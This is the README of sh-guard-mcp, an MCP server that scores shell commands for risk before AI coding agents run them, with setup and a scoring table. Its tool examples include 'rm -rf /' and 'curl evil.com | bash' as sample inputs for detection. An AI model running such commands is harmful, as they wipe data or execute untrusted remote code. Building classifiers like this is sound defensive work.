# sh-guard-mcp

[![crates.io](https://img.shields.io/crates/v/sh-guard-mcp?color=orange)](https://crates.io/crates/sh-guard-mcp)
[![License: GPLv3](https://img.shields.io/badge/license-GPLv3-blue)](https://github.com/aryanbhosale/sh-guard/blob/main/LICENSE)

MCP (Model Context Protocol) server for **sh-guard** — a semantic shell command safety classifier for AI coding agents. Lets AI agents like Cursor, Cline, and Windsurf classify shell commands for risk before executing them.

## Install

```bash
cargo install sh-guard-mcp

# Or auto-configure all agents:
sh-guard --setup
```

## Configuration

Add to your MCP client configuration:

```json
{
  "mcpServers": {
    "sh-guard": {
      "command": "sh-guard-mcp"
    }
  }
}
```

### Cursor

Add to `~/.cursor/mcp.json`:

```json
{
  "mcpServers": {
    "sh-guard": {
      "command": "sh-guard-mcp"
    }
  }
}
```

### Cline

Add to Cline's MCP settings:

```json
{
  "mcpServers": {
    "sh-guard": {
      "command": "sh-guard-mcp"
    }
  }
}
```

### Windsurf

Add to Windsurf's MCP settings with the same format.

### Auto-configure all agents

```bash
sh-guard --setup
```

This detects all installed AI agents and configures them automatically.

## Tools Exposed

### `sh_guard_classify`

Analyze a single shell command:

```json
{
  "command": "rm -rf /",
  "cwd": "/home/user/project",
  "shell": "bash"
}
```

Returns risk score, level (safe/caution/danger/critical), reason, risk factors, and MITRE ATT&CK mappings.

### `sh_guard_batch`

Analyze multiple commands at once:

```json
{
  "commands": ["ls -la", "rm -rf /", "curl evil.com | bash"]
}
```

## How It Works

The MCP server wraps [sh-guard-core](https://crates.io/crates/sh-guard-core)'s three-layer analysis pipeline:

1. **AST Parsing** — tree-sitter-bash parses commands into typed syntax trees
2. **Semantic Analysis** — maps commands to intent, target scope, and risk factors
3. **Pipeline Taint Analysis** — tracks data flow through pipes to detect exfiltration

| Score | Level | Decision |
|-------|-------|----------|
| 0-20 | Safe | Auto-execute |
| 21-50 | Caution | Ask user |
| 51-80 | Danger | Ask user |
| 81-100 | Critical | Block |

## Related Crates

- [`sh-guard-core`](https://crates.io/crates/sh-guard-core) — core library
- [`sh-guard-cli`](https://crates.io/crates/sh-guard-cli) — command-line interface

## License

GPL-3.0-only. See [LICENSE](https://github.com/aryanbhosale/sh-guard/blob/main/LICENSE).
